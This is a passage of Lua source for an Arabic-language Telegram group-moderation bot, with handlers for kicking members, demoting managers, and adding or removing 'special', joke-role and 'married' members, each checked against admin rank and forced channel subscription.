send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله من المدير ثانيين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل مدير ثاني @(.*)$") and BasicConstructor(msg) then
local username = text:match("^تنزيل مدير ثاني @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.id_)
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله من المدير ثانيين'
texts = usertext..status
else
texts = ' ⋄لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^تنزيل مدير ثاني (%d+)$") and BasicConstructor(msg) then
local userid = text:match("^تنزيل مدير ثاني (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله من المدير ثانيين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم تنزيله من المدير ثانيين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text == ("طرد") and msg.reply_to_message_id_ ~=0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ⋄تم تعطيل الطرد') 
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع طرد البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n⋄عذرا لا تستطيع طرد ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,' ⋄ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ⋄البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
statusk  = '\n⋄تم طرد العضو'
send(msg.chat_id_, msg.id_, usertext..statusk)
end,nil)
chat_kick(result.chat_id_, result.sender_user_id_)
end,nil)   
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end  
if text and text:match("^طرد @(.*)$") and Mod(msg) then 
local username = text:match("^طرد @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ⋄تم تعطيل الطرد') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع طرد البوت ")
return false 
end
if Can_or_NotCan(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n⋄عذرا لا تستطيع طرد ( '..Rutba(result.id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data)   
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,' ⋄ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ⋄البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
statusk  = '\n⋄تم طرد العضو'
texts = usertext..statusk
chat_kick(msg.chat_id_, result.id_)
send(msg.chat_id_, msg.id_, texts)
end,nil)   
end
else
send(msg.chat_id_, msg.id_, ' ⋄لا يوجد حساب بهاذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  

if text and text:match("^طرد (%d+)$") and Mod(msg) then 
local userid = text:match("^طرد (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ⋄تم تعطيل الطرد') 
return false
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع طرد البوت ")
return false 
end
if Can_or_NotCan(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n⋄عذرا لا تستطيع طرد ( '..Rutba(userid,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,' ⋄ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ⋄البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
chat_kick(msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
 usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
 statusk  = '\n⋄تم طرد العضو'
send(msg.chat_id_, msg.id_, usertext..statusk)
else
 usertext = '\n⋄العضو »> '..userid..''
 statusk  = '\n⋄تم طرد العضو'
send(msg.chat_id_, msg.id_, usertext..statusk)
end;end,nil)
end,nil)   
end
return false
end
------------------------------------------------------------------------
------------------------------------------------------------------------
if text == 'مسح المميزين' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
database:del(bot_id..'Special:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⋄تم مسح المميزين')
end
if text == ("المميزين") then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
local list = database:smembers(bot_id..'Special:User'..msg.chat_id_)
t = "\n⋄قائمة مميزين الجروب \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ⋄لا يوجد مميزين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("تاك للمميزين") or text == ("صيح المميزين") then
local list = database:smembers(bot_id..'Special:User'..msg.chat_id_)
t = "\n⋄وينكم تعالو يريدوكم بالجروب \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- {"..v.."}\n"
end
end
if #list == 0 then
t = " ⋄لا يوجد مميزين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("رفع مميز") and tonumber(msg.reply_to_message_id_) ~= 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ⋄تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
local  statuss  = '\n⋄تم ترقيته مميز'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع مميز @(.*)$") and Mod(msg) then
local username = text:match("^رفع مميز @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ⋄تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
database:sadd(bot_id..'Special:User'..msg.chat_id_, result.id_)
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
local  statuss  = '\n⋄تم ترقيته مميز'
texts = usertext..statuss
else
texts = ' ⋄لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match("^رفع مميز (%d+)$") and Mod(msg) then
local userid = text:match("^رفع مميز (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ⋄تم تعطيل الرفع') 
return false
end
database:sadd(bot_id..'Special:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
local  statuss  = '\n⋄تم ترقيته مميز'
send(msg.chat_id_, msg.id_, usertext..statuss)
else
usertext = '\n⋄العضو »> '..userid..''
local  statuss  = '\n⋄تم ترقيته مميز'
send(msg.chat_id_, msg.id_, usertext..statuss)
end;end,nil)
return false
end

if (text == ("تنزيل مميز")) and msg.reply_to_message_id_ then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل مميز @(.*)$") and Mod(msg) then
local username = text:match("^تنزيل مميز @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله من المميزين'
texts = usertext..status
else
texts = ' ⋄لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^تنزيل مميز (%d+)$") and Mod(msg) then
local userid = text:match("^تنزيل مميز (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:srem(bot_id..'Special:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄لعضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end  
------------------------------------------------------------------------
if text == 'تنزيل المطايه' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
database:del(bot_id..'Mote:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⋄تم مسح جميع المطايه')
end
if text == ("تاك للمطايه") then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
local list = database:smembers(bot_id..'Mote:User'..msg.chat_id_)
t = "\n⋄قائمة مطايه الجروب \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."»> المطي [@"..username.."]\n"
else
t = t..""..k.."»> المطي `"..v.."`\n"
end
end
if #list == 0 then
t = " ⋄لا يوجد مطايه"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع مطي") and tonumber(msg.reply_to_message_id_) ~= 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ⋄تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Mote:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n⋄تم رفع العضو مطي في الجروب \n⋄تعال حبي استلم العربانه'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل مطي")) and msg.reply_to_message_id_ then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Mote:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيل العضو مطي في الجروب\n⋄تعال حبي رجع العربانه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح المتزوجين' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
database:del(bot_id..'Mode:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⋄تم مسح جميع المتزوجين')
end
if text == ("تاك للمتزوجين") then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
local list = database:smembers(bot_id..'Mode:User'..msg.chat_id_)
t = "\n⋄قائمه ازواج الجروب \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."»> الزوج [@"..username.."]\n"
else
t = t..""..k.."»> الزوجه `"..v.."`\n"
end
end
if #list == 0 then
t = " ⋄مع الاسف لا يوجد متزوجين"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("زواج") and tonumber(msg.reply_to_message_id_) ~= 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ⋄تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Mode:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضــو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n⋄تم زواجكم بنجاح في الجروب \n⋄الطلاق امتي عشان ابقي موجود '
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("طلاق")) and msg.reply_to_message_id_ then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Mode:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضــو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم طلاقكم بنجاح في الجروب\n⋄اوجعو تاني ونبي'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
